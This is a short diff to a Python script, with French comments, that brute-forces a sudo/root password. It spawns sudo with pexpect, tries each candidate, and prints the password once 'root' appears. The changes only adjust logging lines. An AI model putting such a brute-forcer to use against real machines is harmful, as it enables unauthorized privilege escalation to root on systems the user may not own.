@@ -5,7 +5,7 @@ import os
 
 # Fonction pour tester un mot de passe avec pexpect
 def test_password(pw, index):
-#    print(f"[{index}] Test mot de passe: {pw}")
+    print(f"[{index}] Test mot de passe: {pw}")
     try:
         # Lance un processus sudo avec pexpect
 #        child = pexpect.spawn("sudo -S su -c 'whoami'", encoding="utf-8")
@@ -15,7 +15,7 @@ def test_password(pw, index):
         # Attendre la sortie de la commande
         child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.035)
         if child.after == "root":
-            print(f"✅ Mot de passe : {pw}")
+            print(f"✅ Mot de passe : {pw} [{index}]")
             os._exit(0)
     except:
         return None
